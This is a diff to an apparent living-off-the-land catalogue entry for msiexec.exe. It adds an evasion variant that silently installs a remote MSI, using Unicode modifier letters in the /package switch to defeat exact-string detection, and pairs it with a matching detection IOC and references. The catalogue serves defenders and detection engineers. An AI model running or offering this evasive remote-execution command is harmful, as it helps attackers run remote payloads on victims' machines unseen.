@@ -23,6 +23,16 @@ Commands:
     Tags:
       - Execute: MSI
       - Execute: Remote
+  - Command: msiexec /PᵃᶜkAᵍe "{REMOTEURL}" -Q
+    Description: Installs a remote .MSI silently while Unicode modifier letters in the /package switch evade exact-string detection.
+    Usecase: Execute a remote msi file with attack code while evading exact-string command line detection
+    Category: Execute
+    Privileges: User
+    MitreID: T1218.007
+    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    Tags:
+      - Execute: MSI
+      - Execute: Remote
   - Command: msiexec /y {PATH_ABSOLUTE:.dll}
     Description: Calls DllRegisterServer to register the target DLL.
     Usecase: Execute dll files
@@ -63,12 +73,16 @@ Detection:
   - Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml
   - Splunk: https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/uninstall_app_using_msiexec.yml
   - IOC: msiexec.exe retrieving files from Internet
+  - IOC: msiexec.exe option tokens containing non-ASCII characters or Unicode modifier letters
 Resources:
   - Link: https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/
   - Link: https://twitter.com/PhilipTsukerman/status/992021361106268161
   - Link: https://badoption.eu/blog/2023/10/03/MSIFortune.html
+  - Link: https://www.threathunter.ai/blog/azure30-nodejs-backdoor-trojanized-msi-clickfix
 Acknowledgement:
   - Person: netbiosX
     Handle: '@netbiosX'
   - Person: Philip Tsukerman
     Handle: '@PhilipTsukerman'
+  - Person: Liran Ravich
+    Handle: '@Liran017'
